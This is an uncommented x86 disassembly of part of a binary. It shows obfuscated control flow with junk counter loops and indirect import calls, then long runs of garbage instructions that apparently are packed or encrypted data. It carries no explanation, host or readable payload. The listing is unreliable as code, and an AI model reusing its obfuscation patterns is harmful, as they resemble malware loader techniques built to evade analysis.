  4037d0:	xchg   ebx,eax
  4037d1:	call   0x0:0x3b06bacb
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4305a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e866,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e866
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e866,ecx
  403899:	cmp    DWORD PTR ds:0x42e866,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e866,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eadc
  4038bc:	cmp    DWORD PTR ds:0x42e866,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e866
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e866,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ef28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ef28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ef28,edi
  403903:	cmp    DWORD PTR ds:0x42ef28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eaf4
  403920:	cmp    DWORD PTR ds:0x42ef28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ef28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ef28,edi
  40393a:	cmp    DWORD PTR ds:0x42ef28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ec9c
  403988:	cmp    DWORD PTR ds:0x42ef1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4305a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43058e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4305aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4305aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4305aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eae0
  403a03:	mov    edi,DWORD PTR ds:0x4305aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4305aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ef30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4305aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43065a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43065a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43065a,edx
  403a58:	cmp    DWORD PTR ds:0x43065a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eaf8
  403a77:	cmp    DWORD PTR ds:0x43065a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430642,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e85a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43064a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43058a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430692
  403aee:	mov    edx,DWORD PTR ds:0x42eab0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4305b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4305aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4305aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4305aa,edx
  403b28:	cmp    DWORD PTR ds:0x4305aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ebc0
  403b43:	cmp    DWORD PTR ds:0x4305aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4305aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4305aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4305aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430642,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430592,0x430652
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43058e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43058a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4305c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ef20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ef30
  403bc5:	and    ebx,DWORD PTR ds:0x430652
  403bcb:	mov    DWORD PTR ds:0x42ef30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e85a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e85a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e85a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e85a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eafc
  403c05:	cmp    DWORD PTR ds:0x42e85a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4305c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43058e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43058e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43058e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb00
  403c4d:	cmp    DWORD PTR ds:0x43058e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43058e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43058e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43058e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43058e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43064e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43064a,0x4305c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430586
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43064a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ef24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43058a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4305ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e876
  403ce8:	adc    DWORD PTR ds:0x42ef10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4305aa
  403cfb:	sbb    DWORD PTR ds:0x42e86e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x424dcd93],0xffffffcc
  403d2b:	dec    eax
  403d2c:	mov    dh,0x11
  403d2e:	jle    0x403dae
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403da9
  403d35:	or     al,0xd7
  403d37:	dec    ecx
  403d38:	imul   ebx,DWORD PTR [eax+eax*4-0xe937de3],0x1755e33b
  403d43:	jno    0x403d7d
  403d45:	(bad)  
  403d46:	popf   
  403d47:	dec    esi
  403d48:	dec    ebp
  403d49:	lahf   
  403d4a:	xor    DWORD PTR [esi+0x12],esp
  403d4d:	lahf   
  403d4e:	push   esi
  403d4f:	hlt    
  403d50:	xchg   ebx,edi
  403d52:	cmp    al,0xbf
  403d54:	inc    ebx
  403d55:	das    
  403d56:	sbb    bh,bh
  403d58:	repz mov dl,0x27
  403d5b:	xor    eax,0x111df243
  403d60:	iret   
  403d61:	ins    BYTE PTR es:[edi],dx
  403d62:	iret   
  403d63:	call   0xbcc5e0e8
  403d68:	jp     0x403d4d
  403d6a:	mov    eax,0x8365570b
  403d6f:	xchg   BYTE PTR [eax+0x6a9e974c],dl
  403d75:	dec    esi
  403d76:	mov    es:0xe51c6b5f,eax
  403d7c:	sbb    BYTE PTR [ebp-0x1f7f4f2e],ah
  403d82:	leave  
  403d83:	pop    edi
  403d84:	adc    cl,0x6
  403d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d88:	sbb    esp,DWORD PTR [ecx]
  403d8a:	adc    al,0x75
  403d8c:	cmp    eax,0x632e793b
  403d91:	repnz adc eax,0x6bc903
  403d97:	xchg   edx,eax
  403d98:	inc    esi
  403d99:	jg     0x403d6c
  403d9b:	xchg   BYTE PTR [ebx],bh
  403d9d:	mov    eax,ds:0x5853687f
  403da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da3:	cmc    
  403da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da5:	mov    al,0xa0
  403da7:	sub    DWORD PTR [esi],ecx
  403da9:	cld    
  403daa:	je     0x403d80
  403dac:	mov    bl,0x45
  403dae:	test   eax,0xa752f808
  403db3:	pop    edi
  403db4:	push   ecx
  403db5:	jmp    0x815e:0xc3cd3570
  403dbc:	inc    ebx
  403dbd:	shr    ecx,1
  403dbf:	ret    0xad90
  403dc2:	arpl   WORD PTR [ebp-0x85c6e34],bx
  403dc8:	std    
  403dc9:	jne    0x403dc0
  403dcb:	std    
  403dcc:	(bad)  
  403dcd:	icebp  
  403dce:	in     al,dx
  403dcf:	out    0xde,eax
  403dd1:	and    BYTE PTR [ebx],al
  403dd3:	mov    ds:0x80436ae7,eax
  403dd8:	ins    BYTE PTR es:[edi],dx
  403dd9:	push   ebx
  403dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ddb:	repnz mov edx,0x48a0bb46
  403de1:	lods   al,BYTE PTR ss:[esi]
  403de3:	cmp    bl,BYTE PTR [ebp-0x418eee7a]
  403de9:	sbb    ebp,DWORD PTR [edi-0x10]
  403dec:	inc    edx
  403ded:	xor    esi,esi
  403def:	sbb    eax,0xf9dde4e1
  403df4:	mov    ds:0x3a85b8ed,al
  403df9:	sbb    bl,BYTE PTR ds:0xfaff5ced
  403dff:	push   ss
  403e00:	inc    edi
  403e01:	pop    esi
  403e02:	add    edi,DWORD PTR [eax-0x4]
  403e05:	cmp    BYTE PTR [esi-0x2cc9d628],al
  403e0b:	sbb    ebx,ebp
  403e0d:	pusha  
  403e0e:	jg     0x403ddd
  403e10:	or     DWORD PTR [eax],0xfffffff2
  403e13:	jge    0x403db5
  403e15:	mov    eax,ds:0x34d8af43
  403e1a:	mov    eax,0x4d5729a7
  403e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e20:	and    BYTE PTR [edi+esi*8-0x21],dh
  403e24:	test   al,0x46
  403e26:	xchg   ecx,eax
  403e27:	cld    
  403e28:	loope  0x403e1c
  403e2a:	sub    ch,bh
  403e2c:	mov    al,0xc7
  403e2e:	xor    BYTE PTR [ebx-0x7e5395b4],dh
  403e34:	mov    ebp,0x2a1f4974
  403e39:	pop    esp
  403e3a:	cmp    ebp,DWORD PTR [edi-0x4f224dcd]
  403e40:	jb     0x403e4e
  403e42:	pop    ds
  403e43:	daa    
  403e44:	add    eax,0x7066e1b3
  403e49:	scas   eax,DWORD PTR es:[edi]
  403e4a:	push   esi
  403e4b:	sbb    ebx,esi
  403e4d:	mov    ds:0xbe72ab07,al
  403e52:	outs   dx,DWORD PTR ds:[esi]
  403e53:	cs mov edi,0xc84424b2
  403e59:	pop    es
  403e5a:	test   esp,edi
  403e5c:	mov    dl,0xd8
  403e5e:	(bad)  
  403e5f:	pop    DWORD PTR [edx+0x13cc2b58]
  403e65:	mov    ds:0x8a3441f6,al
  403e6a:	(bad)  
  403e6c:	dec    BYTE PTR [ebx+ebp*4-0x41267ac6]
  403e73:	neg    BYTE PTR [ebx]
  403e75:	add    eax,0x38d3b311
  403e7a:	or     dh,ch
  403e7c:	mov    dl,0xfa
  403e7e:	fidiv  WORD PTR [ecx+ebx*8]
  403e81:	jle    0x403ee7
  403e83:	mov    esi,0xecf3aa03
  403e88:	fsub   QWORD PTR [ecx+0x76]
  403e8b:	jle    0x403ed0
  403e8d:	aaa    
  403e8e:	test   al,0xef
  403e90:	rol    BYTE PTR [ecx-0x21238450],0x3a
  403e97:	xchg   edx,eax
  403e98:	adc    ecx,DWORD PTR [edx+0x2b]
  403e9b:	add    eax,0x9f7b5a4b
  403ea0:	mov    ebp,0x4e17384e
  403ea5:	push   ss
  403ea6:	sub    eax,0xb9fa8d9
  403eab:	or     bh,bl
  403ead:	or     BYTE PTR [edi-0x148ff2a5],ah
  403eb3:	sar    DWORD PTR [ebx],1
  403eb5:	mov    ecx,0x987348f9
  403eba:	mov    WORD PTR [ebx-0x56d723a],es
  403ec0:	cli    
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x1d7278c4,al
  403efc:	cld    
  403efd:	aas    
  403efe:	icebp  
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403efb
  403f08:	jle    0x403f77
  403f0a:	std    
  403f0b:	inc    edx
  403f0c:	sbb    al,0xf2
  403f0e:	mov    ah,0xb7
  403f10:	mov    ah,0x8f
  403f12:	sub    eax,0x7081d416
  403f17:	adc    al,0x78
  403f19:	ss and esp,ebx
  403f1c:	rol    DWORD PTR [ecx+0x5d04d9b2],0xd
  403f23:	xchg   DWORD PTR [eax+ebp*8],esp
  403f26:	or     bh,BYTE PTR [esi]
  403f28:	dec    ebp
  403f29:	dec    ecx
  403f2a:	jmp    0xd8bb2dda
  403f2f:	xchg   edi,eax
  403f30:	shl    BYTE PTR [esi+edx*2-0x30],0x88
  403f35:	outs   dx,DWORD PTR ds:[esi]
  403f36:	sbb    bh,0x84
  403f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f3a:	adc    DWORD PTR ds:0x537c14d7,edi
  403f40:	or     bh,BYTE PTR [ebx-0x3734285e]
  403f46:	(bad)  
  403f47:	pushf  
  403f48:	jo     0x403ed7
  403f4a:	xor    BYTE PTR [ecx-0x14],dl
  403f4d:	push   cs
  403f4e:	test   al,0xb7
  403f50:	mov    ds:0x2bb26da3,al
  403f55:	jno    0x403efa
  403f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f58:	fsub   DWORD PTR [ebx-0x33]
  403f5b:	rol    ecx,1
  403f5d:	pop    eax
  403f5e:	sub    DWORD PTR [esi-0x73ba6fae],edi
  403f64:	sysenter 
  403f66:	pop    edx
  403f67:	test   BYTE PTR [edx+0x7fa08425],dl
  403f6d:	pusha  
  403f6e:	mov    bl,0x47
  403f70:	add    edi,ebx
  403f72:	jb     0x403f1e
  403f74:	lods   eax,DWORD PTR ds:[esi]
  403f75:	js     0x403fc0
  403f77:	ret    0xeec0
  403f7a:	xor    ah,cl
  403f7c:	rcl    BYTE PTR [edi-0x5e],0x9c
  403f80:	retf   0xab
  403f83:	lea    esi,[esp+edx*2+0x14]
  403f87:	mov    ah,al
  403f89:	in     eax,dx
  403f8a:	mov    DWORD PTR [edi],ebx
  403f8c:	mov    ah,0xff
  403f8e:	push   eax
  403f8f:	jne    0x403fb9
  403f91:	test   al,0xa8
  403f93:	fcomp  DWORD PTR [eax-0x75]
  403f96:	(bad)  
  403f97:	cmp    ah,BYTE PTR [edx]
  403f99:	cld    
  403f9a:	lods   al,BYTE PTR ds:[esi]
  403f9b:	mov    ds:0x6e5e5d5f,al
  403fa0:	pop    esp
  403fa1:	push   esp
  403fa2:	lods   eax,DWORD PTR ds:[esi]
  403fa3:	shl    DWORD PTR [edx+0x62a1aa57],cl
  403fa9:	xchg   esp,eax
  403faa:	pop    es
  403fab:	pop    eax
  403fac:	jmp    0x403fa4
  403fae:	lock inc edi
  403fb0:	icebp  
  403fb1:	jno    0x403fb9
  403fb3:	pusha  
  403fb4:	or     DWORD PTR [ecx-0x4f],ebp
  403fb7:	pop    esp
  403fb8:	lea    esi,[ecx-0xcd218bc]
  403fbe:	jne    0x403f8a
  403fc0:	ret    0x7e17
  403fc3:	pusha  
  403fc4:	push   ecx
  403fc5:	push   0xffffffa8
  403fc7:	pop    esp
  403fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc9:	mov    ebx,0xce5b86f9
  403fce:	pop    ebp
  403fcf:	test   eax,0xcde649af
  403fd4:	fmul   DWORD PTR [ecx]
  403fd6:	clc    
  403fd7:	mov    edx,0x235597a1
  403fdc:	and    DWORD PTR [esi-0x32],eax
  403fdf:	imul   edx,ebx,0x62c365de
  403fe5:	(bad)  
  403fe6:	repz scas al,BYTE PTR es:[edi]
  403fe8:	mov    edi,DWORD PTR ds:[esi]
  403feb:	add    ecx,DWORD PTR [ebx+0x6da70ee6]
  403ff1:	ja     0x404053
  403ff3:	adc    edx,ecx
  403ff5:	daa    
  403ff6:	rcr    esi,1
  403ff8:	push   0x41
  403ffa:	cmp    eax,DWORD PTR [eax+0x62]
  403ffd:	into   
  403ffe:	or     eax,ebp
  404000:	push   edx
  404001:	mov    ebx,0xf567c8b2
  404006:	rol    dh,1
  404008:	(bad)  
  404009:	push   ebp
  40400a:	cmp    dh,al
  40400c:	nop
  40400d:	mov    ebp,0xe372c419
  404012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404013:	daa    
  404014:	imul   edi,DWORD PTR [edx-0x9],0xffffffbb
  404018:	mov    al,0x73
  40401a:	enter  0x635b,0x2
  40401e:	add    DWORD PTR [ebp+0x23],edi
  404021:	in     eax,dx
  404022:	stos   DWORD PTR es:[edi],eax
  404023:	push   ss
  404024:	jbe    0x40405c
  404026:	pop    edx
  404027:	push   es
  404028:	ds gs inc edx
  40402b:	data16 scas al,BYTE PTR es:[edi]
  40402d:	pop    esi
  40402e:	in     eax,0xc0
  404030:	cld    
  404031:	and    BYTE PTR [edi-0x90da9e0],al
  404037:	in     eax,dx
  404038:	jecxz  0x404044
  40403a:	test   ecx,esp
  40403c:	sub    ecx,DWORD PTR [ecx-0x34]
  40403f:	outs   dx,DWORD PTR ss:[esi]
  404041:	mov    edx,0xd1b58e12
  404046:	pop    es
  404047:	add    edx,ebx
  404049:	sbb    eax,0x54fbb0a1
  40404e:	stos   DWORD PTR es:[edi],eax
  40404f:	xchg   esi,eax
  404050:	cmp    eax,0xcebc5d8a
  404055:	(bad)  
  404056:	shl    BYTE PTR [edx],0xde
  404059:	icebp  
  40405a:	leave  
  40405b:	adc    eax,0x13a07a61
  404060:	sar    DWORD PTR [edi],1
  404062:	xor    al,0xb
  404064:	lock or cl,bl
  404067:	popa   
  404068:	popf   
  404069:	shl    DWORD PTR [ecx+0x5413a77c],1
  40406f:	push   ebx
  404070:	inc    eax
  404071:	leave  
  404072:	pop    ss
  404073:	xlat   BYTE PTR ds:[ebx]
  404074:	into   
  404075:	call   0x15566f2b
  40407a:	hlt    
  40407b:	(bad)  
  40407c:	lock pop edx
  40407e:	mov    al,0xe1
  404080:	jge    0x4040c1
  404082:	mov    al,dh
  404084:	gs dec ecx
  404086:	(bad)  
  404087:	jno    0x404014
  404089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40408a:	xor    al,BYTE PTR [ebx+esi*2+0x21]
  40408e:	push   ebx
  40408f:	xchg   edi,eax
  404090:	cmp    dh,BYTE PTR [edx-0x66]
  404093:	xchg   edi,eax
  404094:	mov    edx,DWORD PTR [ebp-0x2c]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x41ae97ff]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x4040fd
  4040c0:	sti    
  4040c1:	sub    DWORD PTR [edi+0x2ef20bd],ebp
  4040c7:	frstor [edx+eax*2]
  4040ca:	add    DWORD PTR [eax-0x34],0x64
  4040ce:	into   
  4040cf:	out    dx,eax
  4040d0:	and    DWORD PTR [ecx],esp
  4040d2:	and    BYTE PTR [esi+0x49e367aa],al
  4040d8:	jg     0x4040b6
  4040da:	iret   
  4040db:	cmp    dh,ch
  4040dd:	xchg   edi,eax
  4040de:	pop    esi
  4040df:	cmp    edi,DWORD PTR [eax+0x1d239109]
  4040e5:	cdq    
  4040e6:	sub    eax,0xc2d3aa48
  4040eb:	sbb    al,0xaf
  4040ed:	mov    ch,0x77
  4040ef:	add    al,0x75
  4040f1:	inc    edx
  4040f2:	adc    eax,0xb38c32be
  4040f7:	icebp  
  4040f8:	(bad)  
  4040f9:	push   esp
  4040fa:	retf   
  4040fb:	or     BYTE PTR [edi-0x43e335a0],bl
  404101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404102:	jns    0x40417d
  404104:	je     0x4040f5
  404106:	sub    al,0xc0
  404108:	jl     0x40412f
  40410a:	retf   
  40410b:	dec    edx
  40410c:	nop
  40410d:	cmp    eax,0x9e493b9
  404112:	outs   dx,DWORD PTR ds:[esi]
  404113:	jbe    0x40416e
  404115:	mov    al,0x42
  404117:	or     cl,dl
  404119:	cmp    al,0x1f
  40411b:	scas   eax,DWORD PTR es:[edi]
  40411c:	fsubp  st(7),st
  40411e:	xchg   edx,eax
  40411f:	neg    ebp
  404121:	mov    eax,ds:0x319a5dbf
  404126:	fisttp QWORD PTR [eax-0x6d]
  404129:	outs   dx,BYTE PTR ds:[esi]
  40412a:	in     al,dx
  40412b:	jo     0x404163
  40412d:	outs   dx,BYTE PTR ds:[esi]
  40412e:	mov    bh,BYTE PTR [edx+ebx*2]
  404131:	lods   eax,DWORD PTR ds:[esi]
  404132:	jns    0x404185
  404134:	jnp    0x4041a1
  404136:	mov    eax,0xf142bf63
  40413b:	std    
  40413c:	adc    BYTE PTR [ebp+0x79],dh
  40413f:	nop
  404140:	test   DWORD PTR [edi],0xbdb877ce
  404146:	sub    dh,BYTE PTR [esi]
  404148:	shl    BYTE PTR [edx],1
  40414a:	xchg   esi,eax
  40414b:	arpl   di,bx
  40414d:	mov    esp,0xbcd739f3
  404152:	add    esi,DWORD PTR [edx+0x55]
  404155:	loope  0x404183
  404157:	sahf   
  404158:	xchg   edi,eax
  404159:	sahf   
  40415a:	lock sub DWORD PTR gs:[ebx],esi
  40415e:	imul   edx,DWORD PTR [ebp+0x30],0xffffffbc
  404162:	into   
  404163:	lods   al,BYTE PTR gs:[esi]
  404165:	and    eax,0xc93052d4
  40416a:	sub    BYTE PTR [ebp+0x1d],bh
  40416d:	dec    eax
  40416e:	std    
  40416f:	rcl    DWORD PTR [edi+0x553615f7],1
  404175:	xchg   esi,eax
  404176:	push   esp
